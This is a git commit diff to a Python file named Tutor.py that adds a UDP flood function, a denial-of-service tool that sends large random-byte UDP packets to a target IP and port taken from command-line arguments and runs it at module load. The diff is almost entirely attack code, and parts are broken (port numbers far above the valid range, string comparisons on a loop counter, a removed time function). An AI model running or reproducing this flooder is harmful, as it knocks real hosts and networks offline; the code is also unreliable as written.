ac3fad966f0ffc81e818ddf8cda402c10d9c5be8
ZanStore17 <102655575+ZanStore17@users.noreply.github.com>
2023-07-21 15:11:02 +0700

    Update Tutor.py

--- Tutor.py
+++ Tutor.py
@@ -197,7 +197,29 @@ def join():
         except:
              s.close()
              print('[+] server error')
-   
+def UDPFlood():
+    port = int(sys.argv[2])
+    randport=(True,False)[port==0]
+    ip = sys.argv[1]
+    dur = int(sys.argv[3])
+    clock=(lambda:0,time.clock)[dur>0]
+    duration=(1,(clock()+dur))[dur>0]
+    print('UDP: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    bytes=random._urandom(65500)
+    while True:
+        port=(random.randint(1,15000000),port)[randport]
+        if clock()<duration:
+            sock.sendto(bytes,(ip,port))
+        else:
+            break
+    print('DONE')
+UDPFlood()
 for x in range(th):
+ if th == "anjg":
   th = threading.Thread(target=join)
   th.start()
+  
+ elif th == "anjg2":
+   th2 = threading.Thread(target=UDPFlood)
+   th2.start()
